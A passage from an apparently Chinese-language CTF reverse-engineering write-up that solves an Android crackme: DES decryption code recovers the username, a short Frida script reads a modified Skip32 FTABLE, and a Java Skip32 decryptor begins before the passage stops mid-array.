class="line">*</span><br><span class="line">* r: an array of <span class="built_in">bytes</span> to be processed</span><br><span class="line">* ks: one of the subkeys to be used <span class="keyword">for</span> processing</span><br><span class="line">* sp: output <span class="keyword">from</span> the processing</span><br><span class="line">*/</span><br><span class="line">static void f(ubyte *r, ubyte *ks, ubyte *sp) &#123;</span><br><span class="line"> ubyte er[<span class="number">6</span>]; /* <span class="number">48</span> bits */</span><br><span class="line"> ubyte sr[<span class="number">4</span>]; /* <span class="number">32</span> bits */</span><br><span class="line"> <span class="built_in">int</span> i;</span><br><span class="line"></span><br><span class="line"> /* initialize */</span><br><span class="line"> memset(er, <span class="number">0</span>, sizeof(er));</span><br><span class="line"> memset(sr, <span class="number">0</span>, sizeof(sr));</span><br><span class="line"></span><br><span class="line"> /* permute <span class="string">&#x27;r&#x27;</span> using table E */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i) &#123;</span><br><span class="line">  pokeBit(er, i, peekBit(r, E[i] - <span class="number">1</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* xor <span class="string">&#x27;er&#x27;</span> <span class="keyword">with</span> <span class="string">&#x27;ks&#x27;</span> <span class="keyword">and</span> store back into <span class="string">&#x27;er&#x27;</span> */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">  er[i] ^= ks[i];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* process <span class="string">&#x27;er&#x27;</span> six bits at a time <span class="keyword">and</span> store resulting four bits <span class="keyword">in</span> <span class="string">&#x27;sr&#x27;</span> */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">  <span class="built_in">int</span> j = i * <span class="number">6</span>;</span><br><span class="line">  <span class="built_in">int</span> b[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">int</span> k, row, col, m, n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">6</span>; ++k) &#123;</span><br><span class="line">   b[k] = peekBit(er, j + k) != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  row = <span class="number">2</span> * b[<span class="number">0</span>] + b[<span class="number">5</span>];</span><br><span class="line">  col = <span class="number">8</span> * b[<span class="number">1</span>] + <span class="number">4</span> * b[<span class="number">2</span>] + <span class="number">2</span> * b[<span class="number">3</span>] + b[<span class="number">4</span>];</span><br><span class="line">  m = S[i][row * <span class="number">16</span> + col]; /* apply table s */</span><br><span class="line">  n = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (m &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="built_in">int</span> p = m % <span class="number">2</span>;</span><br><span class="line">   pokeBit(sr, (i + <span class="number">1</span>) * <span class="number">4</span> - n, p == <span class="number">1</span>);</span><br><span class="line">   m /= <span class="number">2</span>;</span><br><span class="line">   n++;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* permute sr using table P */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">  pokeBit(sp, i, peekBit(sr, P[i] - <span class="number">1</span>));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Processing of block of the message</span><br><span class="line">*</span><br><span class="line">* message: an <span class="number">8</span> byte block <span class="keyword">from</span> the message</span><br><span class="line">* ks: the subkeys to use <span class="keyword">in</span> processing</span><br><span class="line">* ep: space <span class="keyword">for</span> an encoded <span class="number">8</span> byte block allocated by the caller</span><br><span class="line">*/</span><br><span class="line">static void processMessage(const ubyte *message, subkey_t ks, ubyte *ep) &#123;</span><br><span class="line"> ubyte left[<span class="number">17</span>][<span class="number">4</span>];  /* <span class="number">32</span> bits */</span><br><span class="line"> ubyte right[<span class="number">17</span>][<span class="number">4</span>]; /* <span class="number">32</span> bits */</span><br><span class="line"> ubyte mp[<span class="number">8</span>];        /* <span class="number">64</span> bits */</span><br><span class="line"> ubyte e[<span class="number">8</span>];         /* <span class="number">64</span> bits */</span><br><span class="line"> <span class="built_in">int</span> i, j;</span><br><span class="line"></span><br><span class="line"> /* permute <span class="string">&#x27;message&#x27;</span> using table IP */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">  pokeBit(mp, i, peekBit(message, IP[i] - <span class="number">1</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* split <span class="string">&#x27;mp&#x27;</span> <span class="keyword">in</span> half <span class="keyword">and</span> process the resulting series of <span class="string">&#x27;l&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;r */</span></span><br><span class="line"><span class="string"> for (i = 0; i &lt; 32; ++i) &#123;</span></span><br><span class="line"><span class="string">  pokeBit(left[0], i, peekBit(mp, i));</span></span><br><span class="line"><span class="string">  pokeBit(right[0], i, peekBit(mp, i + 32));</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> for (i = 1; i &lt; 17; ++i) &#123;</span></span><br><span class="line"><span class="string">  ubyte fs[4]; /* 32 bits */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  memcpy(left[i], right[i - 1], 4);</span></span><br><span class="line"><span class="string">  f(right[i - 1], ks[i], fs);</span></span><br><span class="line"><span class="string">  for (j = 0; j &lt; 4; ++j) &#123;</span></span><br><span class="line"><span class="string">   left[i - 1][j] ^= fs[j];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  memcpy(right[i], left[i - 1], 4);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> /* amalgamate r[16] and l[16] (in that order) into &#x27;</span>e<span class="string">&#x27; */</span></span><br><span class="line"><span class="string"> for (i = 0; i &lt; 32; ++i) &#123;</span></span><br><span class="line"><span class="string">  pokeBit(e, i, peekBit(right[16], i));</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> for (i = 32; i &lt; 64; ++i) &#123;</span></span><br><span class="line"><span class="string">  pokeBit(e, i, peekBit(left[16], i - 32));</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> /* permute &#x27;</span>e<span class="string">&#x27; using table IP2 ad return result as a hex string */</span></span><br><span class="line"><span class="string"> for (i = 0; i &lt; 64; ++i) &#123;</span></span><br><span class="line"><span class="string">  pokeBit(ep, i, peekBit(e, IP2[i] - 1));</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/*--------------------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">* Encrypts a message using DES</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">* key: the key to use to encrypt the message</span></span><br><span class="line"><span class="string">* message: the message to be encrypted</span></span><br><span class="line"><span class="string">* len: the length of the message</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">* returns: a paring of dynamically allocated memory for the encoded message,</span></span><br><span class="line"><span class="string">*          and the length of the encoded message.</span></span><br><span class="line"><span class="string">*          the caller will need to free the memory after use.</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">String encrypt(const key_t key, const ubyte *message, int len) &#123;</span></span><br><span class="line"><span class="string"> String result = &#123; 0, 0 &#125;;</span></span><br><span class="line"><span class="string"> subkey_t ks;</span></span><br><span class="line"><span class="string"> ubyte padByte;</span></span><br><span class="line"><span class="string"> int i;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> getSubKeys(key, ks);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> padByte = 8 - len % 8;</span></span><br><span class="line"><span class="string"> result.len = len + padByte;</span></span><br><span class="line"><span class="string"> result.data = (ubyte*)malloc(result.len);</span></span><br><span class="line"><span class="string"> memcpy(result.data, message, len);</span></span><br><span class="line"><span class="string"> memset(&amp;result.data[len], padByte, padByte);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> for (i = 0; i &lt; result.len; i += 8) &#123;</span></span><br><span class="line"><span class="string">  processMessage(&amp;result.data[i], ks, &amp;result.data[i]);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/*--------------------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">* Decrypts a message using DES</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">* key: the key to use to decrypt the message</span></span><br><span class="line"><span class="string">* message: the message to be decrypted</span></span><br><span class="line"><span class="string">* len: the length of the message</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">* returns: a paring of dynamically allocated memory for the decoded message,</span></span><br><span class="line"><span class="string">*          and the length of the decoded message.</span></span><br><span class="line"><span class="string">*          the caller will need to free the memory after use.</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">String decrypt(const key_t key, const ubyte *message, int len) &#123;</span></span><br><span class="line"><span class="string"> String result = &#123; 0, 0 &#125;;</span></span><br><span class="line"><span class="string"> subkey_t ks;</span></span><br><span class="line"><span class="string"> int i, j;</span></span><br><span class="line"><span class="string"> ubyte padByte;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> getSubKeys(key, ks);</span></span><br><span class="line"><span class="string"> /* reverse the subkeys */</span></span><br><span class="line"><span class="string"> for (i = 1; i &lt; 9; ++i) &#123;</span></span><br><span class="line"><span class="string">  for (j = 0; j &lt; 6; ++j) &#123;</span></span><br><span class="line"><span class="string">   ubyte temp = ks[i][j];</span></span><br><span class="line"><span class="string">   ks[i][j] = ks[17 - i][j];</span></span><br><span class="line"><span class="string">   ks[17 - i][j] = temp;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> result.data = (ubyte*)malloc(len);</span></span><br><span class="line"><span class="string"> memcpy(result.data, message, len);</span></span><br><span class="line"><span class="string"> result.len = len;</span></span><br><span class="line"><span class="string"> for (i = 0; i &lt; result.len; i += 8) &#123;</span></span><br><span class="line"><span class="string">  processMessage(&amp;result.data[i], ks, &amp;result.data[i]);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> padByte = result.data[len - 1];</span></span><br><span class="line"><span class="string"> result.len -= padByte;</span></span><br><span class="line"><span class="string"> return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/*--------------------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">* Convienience method for showing the round trip processing of a message</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">void driver(const key_t key, const ubyte *message, int len) &#123;</span></span><br><span class="line"><span class="string"> String encoded, decoded;</span></span><br><span class="line"><span class="string"> char buffer[128];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> printBytes(key, KEY_LEN, buffer);</span></span><br><span class="line"><span class="string"> printf(&quot;Key     : %s\n&quot;, buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> printBytes(message, len, buffer);</span></span><br><span class="line"><span class="string"> printf(&quot;Message : %s\n&quot;, buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> encoded = encrypt(key, message, len);</span></span><br><span class="line"><span class="string"> printBytes(encoded.data, encoded.len, buffer);</span></span><br><span class="line"><span class="string"> printf(&quot;Encoded : %s\n&quot;, buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> decoded = decrypt(key, encoded.data, encoded.len);</span></span><br><span class="line"><span class="string"> printBytes(decoded.data, decoded.len, buffer);</span></span><br><span class="line"><span class="string"> printf(&quot;Decoded : %s\n\n&quot;, buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> /* release allocated memory */</span></span><br><span class="line"><span class="string"> if (encoded.len &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  free(encoded.data);</span></span><br><span class="line"><span class="string">  encoded.data = 0;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> if (decoded.len &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  free(decoded.data);</span></span><br><span class="line"><span class="string">  decoded.data = 0;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/*--------------------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">int main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> String decoded;</span></span><br><span class="line"><span class="string"> int len;</span></span><br><span class="line"><span class="string"> //密钥</span></span><br><span class="line"><span class="string"> const key_t key = &#123;107, 101, 121, 33, 107, 101, 121, 33&#125;;</span></span><br><span class="line"><span class="string"> //密文</span></span><br><span class="line"><span class="string"> const ubyte data[] = &#123;125, 234, 224, 219, 27, 214, 109, 85, 209, 233, 192, 113, 12, 1, 19, 43&#125;;</span></span><br><span class="line"><span class="string"> //密文长度</span></span><br><span class="line"><span class="string"> len = sizeof(data) / sizeof(ubyte);</span></span><br><span class="line"><span class="string"> decoded = decrypt(key, data, len);</span></span><br><span class="line"><span class="string"> printf(&quot;Decoded:%s\n&quot;, decoded.data);</span></span><br><span class="line"><span class="string"> //释放内存</span></span><br><span class="line"><span class="string"> if (decoded.len &gt; 0) &#123;</span></span><br><span class="line"><span class="string">  free(decoded.data);</span></span><br><span class="line"><span class="string">  decoded.data = 0;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>得到username：7d77cfe8</p>
<p>再看checkpass</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e54cf43cac.webp"></p>
<p>可以看到是个skip32算法</p>
<p>github上可以找到该算法的实现：<a target="_blank" rel="noopener" href="https://github.com/boivie/skip32-java">https://github.com/boivie/skip32-java</a></p>
<p>这里魔改了密钥的长度，从10字节改成8字节</p>
<p>在native层JNI_OnLoad中反射修改了FTABLE的值</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e54fd37d0e.webp"></p>
<p>frida去hook一下ftable就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function hook_RegisterNatives() &#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        let Skip32 = Java.use(<span class="string">&quot;com.ex.skip.Skip32&quot;</span>);</span><br><span class="line">        var data = Skip32.FTABLE.value;</span><br><span class="line">        console.log(data);</span><br><span class="line">            </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hook_RegisterNatives);</span><br><span class="line">// <span class="number">164</span>,<span class="number">216</span>,<span class="number">10</span>,<span class="number">132</span>,<span class="number">249</span>,<span class="number">73</span>,<span class="number">247</span>,<span class="number">245</span>,<span class="number">180</span>,<span class="number">34</span>,<span class="number">22</span>,<span class="number">121</span>,<span class="number">154</span>,<span class="number">178</span>,<span class="number">176</span>,<span class="number">250</span>,<span class="number">232</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">139</span>,<span class="number">207</span>,<span class="number">77</span>,<span class="number">203</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">150</span>,<span class="number">218</span>,<span class="number">31</span>,<span class="number">79</span>,<span class="number">57</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">224</span>,<span class="number">3</span>,<span class="number">161</span>,<span class="number">24</span>,<span class="number">242</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">19</span>,<span class="number">184</span>,<span class="number">123</span>,<span class="number">196</span>,<span class="number">234</span>,<span class="number">251</span>,<span class="number">62</span>,<span class="number">84</span>,<span class="number">151</span>,<span class="number">133</span>,<span class="number">108</span>,<span class="number">187</span>,<span class="number">243</span>,<span class="number">100</span>,<span class="number">155</span>,<span class="number">26</span>,<span class="number">125</span>,<span class="number">175</span>,<span class="number">230</span>,<span class="number">246</span>,<span class="number">248</span>,<span class="number">23</span>,<span class="number">107</span>,<span class="number">163</span>,<span class="number">58</span>,<span class="number">183</span>,<span class="number">124</span>,<span class="number">16</span>,<span class="number">194</span>,<span class="number">148</span>,<span class="number">130</span>,<span class="number">28</span>,<span class="number">239</span>,<span class="number">181</span>,<span class="number">27</span>,<span class="number">235</span>,<span class="number">209</span>,<span class="number">146</span>,<span class="number">48</span>,<span class="number">185</span>,<span class="number">86</span>,<span class="number">186</span>,<span class="number">219</span>,<span class="number">134</span>,<span class="number">64</span>,<span class="number">66</span>,<span class="number">192</span>,<span class="number">225</span>,<span class="number">91</span>,<span class="number">89</span>,<span class="number">129</span>,<span class="number">96</span>,<span class="number">103</span>,<span class="number">12</span>,<span class="number">217</span>,<span class="number">145</span>,<span class="number">54</span>,<span class="number">214</span>,<span class="number">193</span>,<span class="number">168</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">102</span>,<span class="number">106</span>,<span class="number">70</span>,<span class="number">1</span>,<span class="number">149</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">153</span>,<span class="number">156</span>,<span class="number">119</span>,<span class="number">152</span>,<span class="number">253</span>,<span class="number">179</span>,<span class="number">195</span>,<span class="number">177</span>,<span class="number">255</span>,<span class="number">220</span>,<span class="number">33</span>,<span class="number">226</span>,<span class="number">236</span>,<span class="number">215</span>,<span class="number">229</span>,<span class="number">222</span>,<span class="number">72</span>,<span class="number">75</span>,<span class="number">30</span>,<span class="number">67</span>,<span class="number">238</span>,<span class="number">159</span>,<span class="number">111</span>,<span class="number">74</span>,<span class="number">61</span>,<span class="number">206</span>,<span class="number">68</span>,<span class="number">40</span>,<span class="number">211</span>,<span class="number">8</span>,<span class="number">213</span>,<span class="number">223</span>,<span class="number">200</span>,<span class="number">104</span>,<span class="number">25</span>,<span class="number">138</span>,<span class="number">204</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">142</span>,<span class="number">199</span>,<span class="number">144</span>,<span class="number">171</span>,<span class="number">201</span>,<span class="number">117</span>,<span class="number">221</span>,<span class="number">202</span>,<span class="number">94</span>,<span class="number">93</span>,<span class="number">50</span>,<span class="number">165</span>,<span class="number">113</span>,<span class="number">137</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">160</span>,<span class="number">14</span>,<span class="number">44</span>,<span class="number">136</span>,<span class="number">81</span>,<span class="number">131</span>,<span class="number">85</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">126</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">53</span>,<span class="number">76</span>,<span class="number">29</span>,<span class="number">116</span>,<span class="number">210</span>,<span class="number">197</span>,<span class="number">254</span>,<span class="number">60</span>,<span class="number">205</span>,<span class="number">252</span>,<span class="number">128</span>,<span class="number">172</span>,<span class="number">231</span>,<span class="number">63</span>,<span class="number">92</span>,<span class="number">166</span>,<span class="number">174</span>,<span class="number">5</span>,<span class="number">36</span>,<span class="number">157</span>,<span class="number">21</span>,<span class="number">82</span>,<span class="number">35</span>,<span class="number">241</span>,<span class="number">42</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">127</span>,<span class="number">0</span>,<span class="number">141</span>,<span class="number">15</span>,<span class="number">227</span>,<span class="number">13</span>,<span class="number">240</span>,<span class="number">189</span>,<span class="number">115</span>,<span class="number">118</span>,<span class="number">112</span>,<span class="number">56</span>,<span class="number">162</span>,<span class="number">237</span>,<span class="number">212</span>,<span class="number">143</span>,<span class="number">99</span>,<span class="number">140</span>,<span class="number">135</span>,<span class="number">17</span>,<span class="number">233</span>,<span class="number">9</span>,<span class="number">120</span>,<span class="number">18</span>,<span class="number">191</span>,<span class="number">147</span>,<span class="number">80</span>,<span class="number">37</span>,<span class="number">198</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">158</span>,<span class="number">208</span>,<span class="number">244</span>,<span class="number">167</span>,<span class="number">188</span>,<span class="number">173</span>,<span class="number">95</span>,<span class="number">109</span>,<span class="number">170</span>,<span class="number">20</span>,<span class="number">88</span>,<span class="number">38</span>,<span class="number">182</span>,<span class="number">228</span>,<span class="number">190</span>,<span class="number">169</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">90</span>,<span class="number">43</span>,<span class="number">71</span></span><br></pre></td></tr></table></figure>

<p>最后解密拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">Skip32</span> &#123;</span><br><span class="line">    private static final <span class="built_in">int</span> FTABLE[] = &#123;<span class="number">164</span>,<span class="number">216</span>,<span class="number">10</span>,<span class="number">132</span>,<span class="number">249</span>,<span class="number">73</span>,<span class="number">247</span>,<span class="number">245</span>,<span class="number">180</span>,<span class="number">34</span>,<span class="number">22</span>,<span class="number">121</span>,<span class="number">154</span>,<span class="number">178</span>,<span class="number">176</span>,<span class="number">250</span>,<span class="number">232</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">139</span>,<span class="number">207</span>,<span class="number">77</span>,<span class="number">203</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">150</span>,<span class="number">218</span>,<span class="number">31</span>,<span class="number">79</span>,<span class="number">57</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">224</span>,<span class="number">3</span>,<span class="number">161</span>,<span class="number">24</span>,<span class="number">242</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">19</span>,<span class="number">184</span>,<span class="number">123</span>,<span class="number">196</span>,<span class="number">234</span>,<span class="number">251</span>,<span class="number">62</span>,<span class="number">84</span>,<span class="number">151</span>,<span class="number">133</span>,<span class="number">108</span>,<span class="number">187</span>,<span class="number">243</span>,<span class="number">100</span>,<span class="number">155</span>,<span class="number">26</span>,<span class="number">125</span>,<span class="number">175</span>,<span class="number">230</span>,<span class="number">246</span>,<span class="number">248</span>,<span class="number">23</span>,<span class="number">107</span>,<span class="number">163</span>,<span class="number">58</span>,<span class="number">183</span>,<span class="number">124</span>,<span class="number">16</span>,<span class="number">194</span>,<span class="number">148</span>,<span class="number">130</span>,<span class="number">28</span>,<span class="number">239</span>,<span class="number">181</span>,<span class="number">27</span>,<span class="number">235</span>,<span class="number">209</span>,<span class="number">146</span>,<span class="number">48</span>,<span class="number">185</span>,<span class="number">86</span>,<span class="number">186</span>,<span class="number">219</span>,<span class="number">134</span>,<span class="number">64</span>,<span class="number">66</span>,<span class="number">192</span>,<span class="number">225</span>,<span class="number">91</span>,<span class="number">89</span>,<span class="number">129</span>,<span class="number">96</span>,<span class="number">103</span>,<span class="number">12</span>,<span class="number">217</span>,<span class="number">145</span>,<span class="number">54</span>,<span class="number">214</span>,<span class="number">193</span>,<span class="number">168</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">102</span>,<span class="number">106</span>,<span class="number">70</span>,<span class="number">1</span>,<span class="number">149</span>,<span class="number">87</span>,<span class="number">110</span>,<span class="number">153</span>,<span class="number">156</span>,<span class="number">119</span>,<span class="number">152</span>,<span class="number">253</span>,<span class="number">179</span>,<span class="number">195</span>,<span class="number">177</span>,<span class="number">255</span>,<span class="number">220</span>,<span class="number">33</span>,<span class="number">226</span>,<span class="number">236</span>,<span class="number">215</span>,<span class="number">229</span>,<span class="number">222</span>,<span class="number">72</span>,<span class="number">75</span>,<span class="number">30</span>,<span class="number">67</span>,<span class="number">238</span>,<span class="number">159</span>,<span class="number">111</span>,<span class="number">74</span>,<span class="number">61</span>,<span class="number">206</span>,<span class="number">68</span>,<span class="number">40</span>,<span class="number">211</span>,<span class="number">8</span>,<span class="number">213</span>,<span class="number">223</span>,<span class="number">200</span>,<span class="number">104</span>,<span class="number">25</span>,<span class="number">138</span>,<span class="number">204</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">142</span>,<span class="number">199</span>,<span class="number">144</span>,<span class="number">171</span>,<span class="number">201</span>,<span class="number">117</span>,<span class="number">221</span>,<span class="number">202</span>,<span class="number">94</span>,<span class="number">93</span>,<span class="number">50</span>,<span class="number">165</span>,<span class="number">113</span>,<span class="number">137</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">160</span>,<span class="number">14</span>,<span class="number">44</span>,<span class="number">136</span>,<span class="number">81</span>,<span class="number">131</span>,<span class="number">85</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">126</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">53</span>,<span class="number">76</span>,<span class="number">29</span>,<span class="number">116</span>,<span class="number">210</span>,<span class="number">197</span>,<span class="number">254</span>,<span class="number">60</span>,<span class="number">205</span>,<span class="number">252</span>,<span class="number">128</span>,<span class="number">172</span>,<span class="number">231</span>,<span class="number">63</span>,<span class="number">92</span>,<span class="number">166</span>,<span class="number">174</span>,<span class="number">5</span>,<span class="number">36</span>,<span class="number">157</span>,<span class="number">21</span>,<span class="number">82</span>,<span class="number">35</span>,<span class="number">241</span>,<span class="number">42</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">127</span>,<span class="number">0</span>,<span class="number">141</span>,<span class="number">15</span>,<span class="number">227</span>,<span class="number">13</span>,<span class="number">240</span>,<span class="number">189</span>,<span class="number">115</span>,<span class="number">118</span>,<span class="number">112</span>,<span class="number">56</span>,<span class="number">162</span>,<span class="number">237</span>,<span class="number">212</span>,<span class="number">143</span>,<span class="number">99</span>,<span class="number">140</span>,<span class="number">135</span>,<span class="number">17</span>,<span class="number">233</span>,<span class="number">9</span>,<span class="number">120</span>,<span class="number">18</span>,<span class="number">191</span>,<span class="number">147</span>,<span class="number">80</span>,<span class="number">37</span>,<span class="number">198</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">158</span>,<span class="number">208</span>,<span class="number">244</span>,<span class="number">167</span>,<span class="number">188</span>,<span class="number">173</span>,<span class="number">95</span>,<span class="number">109</span>,<span class="number">170</span>,<span class="number">20</span>,<span class="number">88</span>,<span class="number">38</span>,<span class="number">182</span>,<span class="number">228</span>,<span class="number">190</span>,<span class="number">169</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">6</span>,<span 